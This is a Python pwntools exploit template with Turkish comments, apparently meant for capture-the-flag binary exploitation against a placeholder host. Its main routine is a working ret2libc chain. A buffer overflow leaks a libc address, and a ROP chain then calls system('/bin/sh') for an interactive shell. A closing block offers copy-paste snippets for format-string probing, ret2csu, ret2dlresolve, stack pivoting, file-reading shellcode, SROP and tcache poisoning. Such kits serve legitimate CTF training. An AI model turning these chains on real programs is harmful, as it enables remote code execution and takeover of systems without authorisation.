#!/usr/bin/env python3
"""
Universal pwntools exploit template
====================================
Local/Remote/GDB modları arasında tek satır geçiş.
Yaygın helper fonksiyonlar dahil.

Kullanım:
    python3 exploit.py            # local
    python3 exploit.py REMOTE     # remote
    python3 exploit.py GDB        # local + GDB attach

Düzenle:
    - BINARY, HOST, PORT
    - libc path (LIBC)
    - GDB script
    - exploit() fonksiyonu
"""

from pwn import *

# ============================================================
# Hedef bilgileri (düzenle)
# ============================================================
BINARY = './vuln'
LIBC   = './libc.so.6'  # bilinen libc varsa, yoksa None
HOST   = 'challenge.ctf.site'
PORT   = 1337

# pwntools context
context.binary  = BINARY
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'info'  # debug için 'debug'

elf  = ELF(BINARY)
libc = ELF(LIBC) if LIBC else elf.libc

# ============================================================
# GDB başlangıç scripti
# ============================================================
GDB_SCRIPT = '''
# Standart breakpoint'ler
# break *main
# break *vuln+0x42
# continue
'''

# ============================================================
# IO yardımcıları
# ============================================================
def start():
    """Bağlantı veya process başlat (LOCAL/REMOTE/GDB)"""
    if args.REMOTE:
        log.info(f'Bağlanıyor: {HOST}:{PORT}')
        return remote(HOST, PORT)
    elif args.GDB:
        log.info('GDB ile local process başlatılıyor')
        return gdb.debug(BINARY, GDB_SCRIPT)
    else:
        log.info(f'Local process: {BINARY}')
        return process(BINARY)

# Kısayollar
s   = lambda x: io.send(x)
sl  = lambda x: io.sendline(x)
sa  = lambda d, x: io.sendafter(d, x)
sla = lambda d, x: io.sendlineafter(d, x)
r   = lambda x=None: io.recv(x) if x else io.recv()
rl  = lambda: io.recvline()
rls = lambda x: io.recvline_contains(x)
ru  = lambda x: io.recvuntil(x)
it  = lambda: io.interactive()

# ============================================================
# Leak yardımcıları
# ============================================================
def leak_libc(puts_got_leak: int, libc_func: str = 'puts') -> int:
    """
    puts(puts@got) ile sızdırılan adresten libc base hesapla.
    libc_func: hangi sembolün adresini sızdırdın (puts, printf, vb.)
    """
    libc_base = puts_got_leak - libc.symbols[libc_func]
    log.success(f'libc base = {hex(libc_base)}')
    libc.address = libc_base
    return libc_base

def leak_canary(payload_to_overwrite_canary_lowest: bytes) -> int:
    """
    Canary leak yardımcısı — format string veya BOF + print kullan.
    Implementasyon challenge'a göre değişir; sadece şablon.
    """
    pass

def find_one_gadget(libc_path: str = None) -> list:
    """one_gadget komutunu çalıştır, offset'leri döndür."""
    import subprocess
    p = libc_path or LIBC
    out = subprocess.check_output(['one_gadget', '--raw', p]).decode()
    gadgets = [int(line.strip(), 16) for line in out.splitlines() if line.strip()]
    log.info(f'one_gadgets: {[hex(g) for g in gadgets]}')
    return gadgets

# ============================================================
# Adres / sembol kısayolları
# ============================================================
def addr(sym: str) -> int:
    """Sembol → adres (libc base ayarlanmışsa libc, değilse binary)"""
    if sym in elf.symbols:
        return elf.symbols[sym]
    if libc.address and sym in libc.symbols:
        return libc.symbols[sym]
    raise ValueError(f'Sembol bulunamadı: {sym}')

def gadget(asm: str) -> int:
    """ROP gadget bul (ROPgadget alternatifi: pwntools ROP)"""
    rop = ROP(elf)
    return rop.find_gadget(asm.split(';')).address

# ============================================================
# Exploit ana mantığı (düzenle)
# ============================================================
def exploit():
    """Tam exploit zinciri burada."""
    global io
    io = start()

    # --- Stage 1: Libc leak ---
    log.info('Stage 1: libc leak')
    rop = ROP(elf)
    rop.puts(elf.got['puts'])
    rop.call(elf.symbols['main'])  # main'e geri dön (stage 2 için)

    offset = 72  # cyclic ile bulduğun offset
    payload = b'A' * offset + rop.chain()

    sla(b'> ', payload)

    leak = u64(rl().strip().ljust(8, b'\x00'))
    leak_libc(leak)

    # --- Stage 2: Shell ---
    log.info('Stage 2: shell')
    rop = ROP([elf, libc])
    rop.system(next(libc.search(b'/bin/sh\x00')))

    payload = b'A' * offset + rop.chain()
    sla(b'> ', payload)

    it()

# ============================================================
# Main
# ============================================================
if __name__ == '__main__':
    exploit()


# ============================================================
# Sık Kullanılan Şablonlar (kopyala-yapıştır)
# ============================================================
"""

# --- Cyclic offset bulma ---
def find_offset():
    io = process(BINARY)
    io.sendline(cyclic(200))
    io.wait()
    core = io.corefile
    fault = core.fault_addr
    offset = cyclic_find(p32(fault & 0xffffffff))
    log.success(f'offset = {offset}')

# --- Format string offset bulma ---
def fmt_offset():
    for i in range(1, 30):
        io = process(BINARY)
        io.sendline(f'AAAA%{i}$p'.encode())
        leak = io.recvall().split(b'AAAA')[1].strip()
        if leak == b'0x41414141':
            log.success(f'fmt offset = {i}')
            return i

# --- ret2csu ---
def ret2csu_call(func_got, arg1, arg2=0, arg3=0):
    rop = ROP(elf)
    rop.raw(rop.find_gadget(['pop rbx', 'pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret']).address)
    rop.raw(p64(0))             # rbx
    rop.raw(p64(1))             # rbp
    rop.raw(p64(func_got))      # r12 = jmp target
    rop.raw(p64(arg1))          # r13 = rdx
    rop.raw(p64(arg2))          # r14 = rsi
    rop.raw(p64(arg3))          # r15 = rdi
    rop.raw(p64(elf.symbols['__libc_csu_init']))  # call gadget
    return rop.chain()

# --- ret2dlresolve (libc bilinmeden) ---
def ret2dlresolve_chain():
    rop = ROP(elf)
    dlr = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
    rop.read(0, dlr.data_addr)
    rop.ret2dlresolve(dlr)
    return rop.chain() + dlr.payload

# --- Stack pivot ---
def stack_pivot(new_stack):
    rop = ROP(elf)
    leave_ret = rop.find_gadget(['leave', 'ret']).address
    pop_rbp = rop.find_gadget(['pop rbp', 'ret']).address
    chain = p64(pop_rbp) + p64(new_stack) + p64(leave_ret)
    return chain

# --- Shellcode (ORW) ---
def orw_shellcode(filename='./flag'):
    sc  = shellcraft.open(filename)
    sc += shellcraft.read('rax', 'rsp', 100)
    sc += shellcraft.write(1, 'rsp', 100)
    return asm(sc)

# --- SROP ---
def srop_frame(rip, rdi=0, rsi=0, rdx=0):
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = rdi
    frame.rsi = rsi
    frame.rdx = rdx
    frame.rip = rip
    return bytes(frame)

# --- Glibc tcache poisoning ---
def tcache_poison(target_addr, glibc_version='2.32'):
    # 2.32+ safe-linking: encoded = (addr >> 12) ^ next
    fd_encoded = (heap_base >> 12) ^ target_addr
    return p64(fd_encoded)

"""
